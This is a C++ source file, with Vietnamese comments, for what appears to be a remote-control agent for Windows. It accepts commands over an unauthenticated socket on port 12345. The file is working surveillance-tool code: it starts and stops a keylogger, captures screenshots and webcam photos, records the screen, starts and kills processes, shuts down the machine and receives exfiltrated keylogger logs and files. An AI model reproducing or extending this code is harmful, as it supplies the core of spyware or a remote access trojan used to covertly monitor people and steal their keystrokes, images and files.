#include "../includes/tasks.h"

void receiveResponse(SOCKET clientSock)
{
    char buffer[1024];
    int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0)
    {
        std::cerr << "Failed to receive response from client." << std::endl;
        return;
    }
    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received response: " << buffer << std::endl;
}

void receiveKeyloggerLog(SOCKET sock)
{
    uint32_t len = 0;

    int received = recv(sock, (char*)&len, sizeof(len), 0);
    if (received != sizeof(len))
    {
        std::cerr << "Failed to receive keylogger log length." << std::endl;
        return;
    }
    if (len == 0)
    {
        std::cout << "No keylogger log available." << std::endl;
        return;
    }

    char* buffer = new char[len + 1];
    int total = 0;

    while (total < len)
    {
        int bytes = recv(sock, buffer + total, len - total, 0);
        if (bytes <= 0)
        {
            std::cerr << "Failed to receive keylogger log content." << std::endl;
            delete[] buffer;
            return;
        }
        total += bytes;
    }

    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received keylogger log (" << len << " bytes):" << std::endl;
    std::cout << buffer << std::endl;
    delete[] buffer;
}

void receiveFile(SOCKET sock)
{
    uint32_t nameLen;
    if (recv(sock, reinterpret_cast<char*>(&nameLen), sizeof(nameLen), 0) != sizeof(nameLen))
    {
        std::cerr << "Failed to receive filename length." << std::endl;
        return;
    }
    char* nameBuf = new char[nameLen + 1];
    if (recv(sock, nameBuf, nameLen, 0) != nameLen)
    {
        std::cerr << "Failed to receive filename." << std::endl;
        delete[] nameBuf;
        return;
    }

    nameBuf[nameLen] = '\0'; // Null-terminate the filename
    std::string filename = "received_" + std::string(nameBuf);
    delete[] nameBuf;

    uint32_t fileSize;
    if (recv(sock, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0) != sizeof(fileSize))
    {
        std::cerr << "Failed to receive file size." << std::endl;
        return;
    }
    if (fileSize == 0)
    {
        std::cout << "No file content received." << std::endl;
        return;
    }

    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile.is_open())
    {
        std::cerr << "Failed to open file for writing: " << filename << std::endl;
        return;
    }
    char buffer[4096];
    int received = 0;

    while (received < fileSize)
    {
        int chunk = recv(sock, buffer, std::min((int)sizeof(buffer), (int)(fileSize - received)), 0);
        if (chunk <= 0)
        {
            std::cerr << "Failed to receive file content." << std::endl;
            outFile.close();
            return;
        }
        outFile.write(buffer, chunk);
        received += chunk;
    }
    outFile.close();
    std::cout << "File received and saved as: " << filename << std::endl;
    std::cout << "File content received from client." << std::endl;
}

void startSocketServer()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return;
    }

    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return;
    }
    std::cout << "Client connected." << std::endl;

    // Nhận lệnh từ client
    char buffer[1024];
    while (true)
    {
        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) 
        {
            std::cout << "Client disconnected." << std::endl;
            break;
        }

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command from client: " << cmd << std::endl;

        // Xử lý lệnh trên server
        handleCommand(clientSock, cmd);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();
}

void sendResponse(SOCKET sock, const std::string& msg)
{
    if (sock != INVALID_SOCKET)
    {
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else
    {
        std::cout << "[Gmail Response]" << msg << std::endl;
    }
}

void handleCommand(SOCKET sock, const std::string& cmd)
{
    if (cmd == "help")
    {
        std::string helpMsg = 
            "Available commands:\n"
            "  help                    - Show this help message\n"
            "  list_services           - List all running services\n"
            "  start <path>            - Start a process from given path\n"
            "  stop <process_name>     - Stop a process by name\n"
            "  list_apps               - List all visible applications\n"
            "  start_keylogger         - Start keylogger\n"
            "  stop_keylogger          - Stop keylogger\n"
            "  screenshot <filename>   - Capture screen and save as PNG\n"
            "  webcam_photo <filename> - Capture single webcam photo\n"
            "  restart                 - Restart the system\n"
            "  shutdown                - Shutdown the system\n"
            "  start_record            - Start screen recording\n"
            "  stop_record             - Stop screen recording\n"
            "  exit                    - Disconnect from server\n";
        sendResponse(sock, helpMsg);
    }
    else if (cmd == "list_services")
    {
        std::string processes = listProcesses();
        sendResponse(sock, processes);
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        bool ok = startProcess(path);
        
        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
        sendResponse(sock, msg);
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string name = cmd.substr(5);
        bool ok = stopProcess(name);
        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
        sendResponse(sock, msg);
    }
    else if (cmd == "list_apps")
    {
        std::string apps = listUserApps();
        sendResponse(sock, apps);
    }
    else if (cmd == "exit")
    {
        std::string msg = "Disconnecting from server...";
        sendResponse(sock, msg);
        closesocket(sock);
        return; // Kết thúc hàm để không xử lý thêm lệnh nào nữa
    }
    else if (cmd == "start_keylogger")
    {
        startKeylogger();
        std::string msg = "Keylogger started.";
        sendResponse(sock, msg);
    }
    else if (cmd == "stop_keylogger")
    {
        stopKeylogger();
        std::string msg = "Keylogger stopped.";
        sendResponse(sock, msg);
    }
    else if (cmd.rfind("screenshot ", 0) == 0)
    {
        std::string filename = cmd.substr(11);
        if (filename.empty())
        {
            filename = "screenshot.png";
        }
        // Thêm extension .png nếu chưa có
        if (filename.find(".png") == std::string::npos && 
            filename.find(".PNG") == std::string::npos)
        {
            filename += ".png";
        }
        
        bool success = captureScreen(filename);
        std::string msg = success ? 
            "Screenshot captured successfully: " + filename : 
            "Failed to capture screenshot.";
        sendResponse(sock, msg);
    }
    else if (cmd == "restart")
    {
        std::string msg = "Initiating system restart...";
        sendResponse(sock, msg);
        
        // Delay một chút để gửi response trước khi restart
        Sleep(1000);
        
        bool success = restartSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to restart system.";
            sendResponse(sock, errorMsg);
        }
        // Nếu restart thành công, connection sẽ bị đóng do máy restart
    }
    else if (cmd == "shutdown")
    {
        std::string msg = "Initiating system shutdown...";
        sendResponse(sock, msg);
        
        // Delay một chút để gửi response trước khi shutdown
        Sleep(1000);
        
        bool success = shutdownSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to shutdown system.";
            sendResponse(sock, errorMsg);
        }
        // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
    }
    else if (cmd.rfind("webcam_photo ", 0) == 0)
    {
        std::string filename = cmd.substr(13);
        if (filename.empty())
        {
            filename = "webcam_photo.jpg"; // Default filename
        }

        std::string startMsg = "Capturing webcam photo: " + filename + "...";
        sendResponse(sock, startMsg);

        bool success = captureWebcamPhoto(filename);
        std::string msg = success ?
            "Webcam photo captured successfully: " + filename :
            "Failed to capture webcam photo.";
        sendResponse(sock, msg);
    }
    else if(cmd == "start_record")
    {
        if (!isRecording())
        {
            std::string filename = "screen_recording.avi"; // Default filename
            startScreenRecording(filename);
            std::string msg = "Screen recording started: " + filename;
            sendResponse(sock, msg);
        }
        else
        {
            std::string msg = "Screen recording is already in progress.";
            sendResponse(sock, msg);
        }
    }
    else if (cmd == "stop_record")
    {
        if (isRecording())
        {
            stopScreenRecording();
            std::string msg = "Screen recording stopped.";
            sendResponse(sock, msg);
        }
        else
        {
            std::string msg = "No screen recording in progress.";
            sendResponse(sock, msg);
        }
    }
    else
    {
        std::string msg = "Unknown command: " + cmd;
        sendResponse(sock, msg);
    }
}

int main()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }
    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    std::cout << "Client connected." << std::endl;

    char buffer[1024];
    while (true)
    {
        // Nhận lệnh từ client
        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) 
        {
            std::cout << "Client disconnected." << std::endl;
            break;
        }

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command from client: " << cmd << std::endl;
        
        // Xử lý lệnh trên server
        handleCommand(clientSock, cmd);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();

    return 0;
}